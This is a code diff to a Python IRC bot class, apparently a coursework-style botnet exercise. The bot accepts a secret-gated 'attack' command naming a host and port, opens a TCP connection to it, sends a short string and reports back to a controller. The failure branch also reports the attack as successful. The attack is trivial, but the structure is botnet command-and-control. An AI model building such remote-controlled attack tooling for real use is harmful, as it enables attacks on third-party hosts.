@@ -164,10 +164,14 @@ class Bot:
 
             msg = msg.split()
 
+            print(msg)
+
             # attack with bot
-            if msg[0] == "attack" and msg[-1] == self.CHANNEL:
+            if msg[0] == "attack" and msg[-1] == self.SECRET:
                 host = msg[1]
                 port = msg[2]
+
+                print("ATTACK")
 
                 self.attack(host, port)
         
@@ -241,10 +245,28 @@ class Bot:
             attack_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             attack_socket.connect((host, port))
             
-            self.send_msg()
+        except Exception as e:            
+            print("Error: Attack failed " + str(e))
 
-        finally:
-            pass
+            # send to controller
+            msg = "PRIVMSG " + self.CONTROLLER
+            msg += " :Attack " + host + " " + port + " successful hello"
+            self.send_msg(msg)
+
+            return
+
+        # send message
+        msg = str(self.ATTACK_COUNT) + " edel" + str(self.NICK_COUNT)
+        msg = bytes(msg, "utf-8")
+        attack_socket.send(msg)
+
+        # close socket
+        attack_socket.close()
+
+        # send to controller
+        msg = "PRIVMSG " + self.CONTROLLER
+        msg += " :Attack " + host + " " + port + " successful hello"
+        self.send_msg(msg)
 
         return
 
@@ -258,6 +280,7 @@ class Bot:
     def shutdown(self):
         """ Shutdown the bot """
 
+        # send msg
         msg = "PRIVMSG " + self.CONTROLLER + " :edel" + str(self.NICK_COUNT) + " " + self.SECRET + "\n"
 
         self.send_msg(msg)
